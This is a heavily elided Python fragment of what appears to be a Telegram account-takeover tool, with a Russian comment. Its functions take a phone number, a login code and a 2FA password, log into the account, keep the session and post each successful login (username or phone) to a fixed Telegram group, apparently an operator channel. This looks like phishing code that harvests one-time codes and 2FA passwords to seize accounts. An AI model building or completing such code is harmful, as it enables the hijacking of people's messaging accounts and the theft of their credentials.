...
def verify_code():
    ...
    # ЗАПУСКАЕМ АСИНХРОННЫЙ ВХОД В АККАУНТ
    try:
...
async def login_to_telegram(phone, code):
    ...
    try:
        ...
        try:
            bot.send_message(
                -1004479107837,
                f"✅ Вход выполнен: {me.username or me.phone}",
        ...
        if 'client' not in user_sessions.get(phone, {}):
...
async def login_with_2fa(phone, code2fa):
    ...
    try:
        ...
        me = await client.get_me()
        print(f"✅ Вход с 2FA выполнен: {me.username or me.phone}")
        
        # Отправляем уведомление в группу
        try:
            bot.send_message(
                -1004479107837,
                f"✅ Вход с 2FA: {me.username or me.phone}",
                message_thread_id=45
            )
        except:
            pass
